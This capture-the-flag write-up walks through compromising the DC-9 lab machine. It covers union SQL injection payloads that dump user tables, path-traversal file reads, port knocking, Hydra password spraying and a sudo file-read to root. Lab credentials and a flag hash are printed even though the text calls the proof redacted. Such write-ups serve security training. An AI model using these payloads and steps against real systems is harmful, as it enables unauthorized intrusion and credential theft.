---
title: "DC-9"
description: "OffSec Proving Grounds DC-9 — a classic SQL injection chain: union-based SQLi dumps two sets of staff credentials, an admin panel hides a local file inclusion bug, LFI reads a firewall's port-knock sequence, and knocking opens SSH for a sudo-binary file-read exploit to root."
tags:
  - Proving Grounds
  - OffSec
  - Web
  - SQL Injection
  - LFI
  - Intermediate
---

# DC-9

**Box info:** Difficulty: Intermediate · OS: Linux (Debian 10) · Focus: Union-based SQL injection, credential cracking, local file inclusion against a hardened firewall, port knocking, sudo wildcard/arbitrary-file-read abuse.

A "Staff Details" PHP application is vulnerable to classic union-based SQL injection in its search form. Two separate databases hand over two sets of credentials; the admin panel they unlock has its own local file inclusion bug, which is the only way to actually reach SSH — it's otherwise hidden behind port knocking. From there a restricted sudo rule that was only meant to print lines of a file is abused to read `proof.txt` directly as root.

---

## 1. Reconnaissance (nmap)

```bash
nmap -sC -sV -p- --min-rate=1000 -oA nmap/dc9 192.168.119.209
```

```text
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
```

Port 22 shows as **filtered**, not closed — a strong hint that SSH is firewalled off rather than absent, and will need to be unlocked some other way later. For now, port 80 is the only usable entry point.

![Example.com Staff Details home page](images/dc-9/image.png)

## 2. Enumeration — SQL injection in the search form

The "Search" feature takes a `search` POST parameter and reflects results back in a fixed-looking table, a strong candidate for SQL injection. A UNION probe against the 6-column layout confirms it:

```text
'+UNION+SELECT+1,2,3,4,5,6--+-
```

```text
ID: 1
Name: 2 3
Position: 4
Phone No: 5
Email: 6
```

![Burp Repeater showing the UNION SELECT reflected into the Search results page](images/dc-9/image-4.png)

With 6 injectable columns confirmed, the injection is walked up to pull schema names, table names, and finally data:

```sql
-- enumerate databases
'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata--+-

-- enumerate tables in the current db
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,table_name,0x7c)+fRoM+information_schema.tables--+-

-- dump Staff.Users
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,Username,0x7c,Password,0x7c)+fRoM+Users--+-
```

```text
|admin|856f5de590ef37314e7c3bdf6f8a66dc|
```

A second, separate `users` database (unrelated to `Staff`) is also reachable from the same injection point and holds a much larger set of **plaintext** passwords:

```sql
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,Username,0x7c,Password,0x7c)+fRoM+users.UserDetails--+-
```

```text
|marym|3kfs86sfd|,|julied|468sfdfsd2|,|fredf|4sfd87sfd1|,|barneyr|RocksOff|,
|tomc|TC&TheBoyz|,|jerrym|B8m#48sd|,|wilmaf|Pebbles|,|bettyr|BamBam01|,
|chandlerb|UrAG0D!|,|joeyt|Passw0rd|,|rachelg|yN72#dsd|,|rossg|ILoveRachel|,
|monicag|3248dsds7s|,|phoebeb|smellycats|,|scoots|YR3BVxxxw87|,
|janitor|Ilovepeepee|,|janitor2|Hawaii-Five-0|
```

`sqlmap` against the same injection point confirms and automates the dump:

```bash
sqlmap -r sql.txt --batch --dump --technique=U -D users
```

The MD5 hash for `admin` cracks instantly against CrackStation:

![CrackStation resolving the admin MD5 hash to the plaintext password](images/dc-9/image-12.png)

```text
856f5de590ef37314e7c3bdf6f8a66dc → transorbital1
```

## 3. Foothold — admin LFI leaks the port-knock sequence

Logging into the admin panel (`admin:transorbital1`) unlocks extra menu items — **Manage**, **Add Record**, **Log Out**:

![Logged in as admin, with Manage / Add Record now visible](images/dc-9/image-14.png)

Both `manage.php` and `addrecorddb.php` take a `file` parameter to load a specific record source, which looks like a textbook local file inclusion candidate. Pointing it at `/etc/passwd` directly fails (the app only resolves relative paths), but a directory-traversal payload succeeds:

```text
http://192.168.172.209/addrecorddb.php?file=../../../../../../etc/passwd
```

![addrecorddb.php?file=../../../../../../etc/passwd dumping /etc/passwd](images/dc-9/image-15.png)

With arbitrary file read confirmed, the same LFI is pointed at the firewall configuration — since port 22 showed as *filtered* in the nmap scan, `knockd.conf` is the logical next target:

```text
http://192.168.172.209/manage.php?file=../../../../../../etc/knockd.conf
```

![manage.php?file= LFI reading /etc/knockd.conf and revealing the knock sequence](images/dc-9/image-17.png)

```text
[openSSH]
    sequence = 7469,8475,9842
    seq_timeout = 25
    command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

That is the port-knock sequence that opens SSH. Knocking it and re-scanning confirms the port is now open:

```bash
for p in 7469 8475 9842; do nmap -Pn --host_timeout 201 --max-retries 0 -p $p 192.168.101.209; done
nmap -sC -sV -p 22 192.168.101.209
```

```text
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
```

### Credential spraying

With SSH reachable, the plaintext passwords recovered from the second database are sprayed against the usernames from `/etc/passwd`:

```bash
hydra -L users.list -P pass.list 192.168.101.209 ssh
```

```text
[22][ssh] host: 192.168.101.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.101.209   login: joeyt       password: Passw0rd
[22][ssh] host: 192.168.101.209   login: janitor     password: Ilovepeepee
```

Logging in as `joeyt` and pivoting to `janitor` (same password) turns up a hidden `.secrets-for-putin` directory with a few more candidate passwords found "on post-it notes":

```bash
cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
```

```text
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

Re-running Hydra with this expanded password list finds a new, more useful account:

```bash
hydra -L users.list -P pass.list 192.168.101.209 ssh
```

```text
[22][ssh] host: 192.168.101.209   login: fredf   password: B4-Tru3-001
```

### User flag

```bash
ssh fredf@192.168.101.209
cat local.txt
```

```text
<LOCAL_REDACTED>
```

## 4. Privilege escalation

`fredf` has a narrow sudo rule for a custom binary:

```bash
sudo -l
```

```text
User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

```bash
sudo /opt/devstuff/dist/test/test --help
```

```text
Usage: python test.py read append
```

The tool is meant to append the contents of one file onto another, running as root with no path restriction on either argument — which means it can be pointed at a file the invoking user has no permission to read directly, such as `/root/proof.txt`:

```bash
touch two.txt
sudo /opt/devstuff/dist/test/test /root/proof.txt two.txt
cat two.txt
```

## 5. Root / proof.txt

```text
8cd7a5b17e7efd4affc36fdea8305712
```

(redacted here as `<PROOF_REDACTED>`) — the content of `two.txt` is the root-owned `proof.txt`, read into a world-readable file by the root-executed `test` binary, without ever obtaining an interactive root shell.

---

## Takeaway

DC-9 chains three distinct, low-severity-looking bugs into full compromise: SQL injection for credentials, an admin-only LFI that was the *only* way to see the firewall's port-knock secret, and a "harmless" file-append utility that becomes an arbitrary-file-read-as-root primitive once wrapped in a NOPASSWD sudo rule. Each step alone looks survivable; chained together they are not.
